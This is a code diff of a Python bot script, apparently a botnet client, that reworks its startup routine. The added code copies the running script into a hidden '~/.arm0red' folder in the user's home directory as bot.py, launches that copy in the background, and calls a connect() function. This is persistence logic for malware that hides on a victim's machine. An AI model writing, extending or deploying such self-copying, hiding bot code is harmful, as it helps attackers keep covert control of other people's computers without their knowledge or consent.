@@ -307,21 +307,42 @@ def fileServer():
 def srtChk():
     script = sys.argv
     name = str(script[0])
-    try:
-        path = '~/.arm0red'
+    hd = str(os.path.expanduser('~'))
+    hdPath = hd + '/.arm0red'
+    clone = hdPath + '/bot.py'
+    if name == clone:
         if debugmode:
-            print("Creating Directory: ~/.arm0red")
-        os.mkdir(path)
-    except OSError as mdr:
-        if debugmode:
-            print("ERROR: " + str(mdr))
-    if debugmode:
-        print("Copying " + name + " to: ~/.arm0red/bot.py")
-    os.system("cp " + name + " ~/.arm0red/bot.py")
-    clone = '~/.arm0red/bot.py &'
-    if debugmode:
-        print("Running: " + clone)
-    os.system(clone)
+            print(name + " and "+ clone + " are the same file!")
+            connect()
+            #print("Cloned bot is already running!")
+    else:
+        try:
+            if debugmode:
+                print("NAME: " + name)
+                print("CLONE: " + clone)
+                print("HOME DIR: " + hd)
+            if os.path.isdir(hdPath) and os.path.exists(hdPath):
+                if debugmode:
+                    print("Directory Exists: " + hdPath)
+            else:
+                if debugmode:
+                    print("Creating Directory: " + hdPath)
+                os.mkdir(hdPath)#, 0700)
+            if os.path.isfile(clone):
+                if debugmode:
+                    print("Bot File Exists: " + clone)
+            else:
+                if name != clone:
+                    if debugmode:
+                        print("Copying " + name + " to: " + clone)
+                    os.system("cp " + name + " " + clone)
+            if debugmode:
+                print("Running: " + clone)
+                runcmd_noout(clone)
+                #os.system(clone)
+        except OSError as mdr:
+            if debugmode:
+                print("ERROR: " + str(mdr))
 
 def main():
     global connected
